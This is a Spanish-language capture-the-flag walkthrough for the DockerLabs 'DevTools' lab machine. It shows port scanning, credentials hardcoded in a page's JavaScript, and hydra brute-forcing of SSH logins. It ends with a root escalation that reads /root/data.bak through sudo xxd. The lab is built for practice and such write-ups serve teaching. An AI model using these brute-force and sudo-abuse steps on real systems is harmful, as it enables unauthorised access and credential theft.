# DevTools DockerLabs (intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip devtools.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh devtools.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 11:48 EST
Nmap scan report for asucar.dl (172.17.0.2)
Host is up (0.000032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 4d:ea:92:ba:53:e3:b8:dc:71:95:50:19:87:6b:b2:6d (ECDSA)
|_  256 fa:77:68:76:dc:8e:b1:cd:56:5f:c1:79:89:ad:fa:78 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: \xC2\xBFQu\xC3\xA9 son las DevTools del Navegador?
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds
```

Si entramos en la pagina nos pedira usuario y contraseña de la pagina, por lo que en algun lugar tendra que haber las credenciales en algun `js`, si inspeccionamos la pagina, veremos la siguiente linea:

```html
<script src="backupp.js" defer></script>
```

Si entramos en ese archivo, veremos lo siguiente:

```js
const usuario = "chocolate";
const contrasena = "chocolate"; // Antigua contraseÃ±a baluleroh

const solicitarAutenticacion = () => {
    const credenciales = prompt("Ingrese las credenciales en el formato usuario:contraseÃ±a:");

    if (credenciales) {
        const [entradaUsuario, entradaContrasena] = credenciales.split(":");

        if (entradaUsuario === usuario && entradaContrasena === contrasena) {
            alert("AutenticaciÃ³n exitosa. Â¡Bienvenido!");
        } else {
            alert("AutenticaciÃ³n fallida. IntÃ©ntelo de nuevo.");
            solicitarAutenticacion(); // Reintentar autenticaciÃ³n
        }
    } else {
        alert("Debe ingresar las credenciales.");
        solicitarAutenticacion();
    }
};

solicitarAutenticacion();
```

Veremos un comentario de que su antigua contraseña era `baluleroh`, por lo que para descartar posibles credenciales, pondremos como usuario y contraseña:

```
User: chocolate
Pass: chocolate
```

Por `ssh` de la siguiente forma:

```shell
ssh chocolate@<IP>
```

Metemos como contraseña `chocolate`, pero vemos que no nos funciona, si probamos la antigua contraseña `baluleroh` tampoco nos deja, por lo que tendremos que descubrir que usuario le pertenece dicha contraseña `baluleroh`:

## Escalate user carlos

```shell
hydra -L <WORDLIST> -p baluleroh ssh://<IP> -t 64 
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-16 12:17:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 8295455 login tries (l:8295455/p:1), ~129617 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: carlos   password: baluleroh
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Sacamos las credenciales del usuario `carlos`, por lo que nos conectamos por `ssh`:

```shell
ssh carlos@<IP>
```

Metemos la contraseña `baluleroh` y ya estariamos dentro.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for carlos on fb5c64da956d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User carlos may run the following commands on fb5c64da956d:
    (ALL) NOPASSWD: /usr/bin/ping
    (ALL) NOPASSWD: /usr/bin/xxd
```

Y si leemos el archivo llamado `nota.txt` que esta en la `home` de nuestro usuario, veremos lo siguiente:

```
Backup en data.bak dentro del directorio de root
```

Por lo que podremos hacer lo siguiente como `root` para poder leer ese archivo:

```shell
LFILE=/root/data.bak
sudo xxd "$LFILE" | xxd -r
```

Info:

```
root:balulerito
```

Por lo que ya tendremos las credenciales de `root` solo tendremos que hacer lo siguiente:

```shell
su root
```

Metemos la contraseña `balulerito` y seremos `root`, por lo que ya habremos terminado.
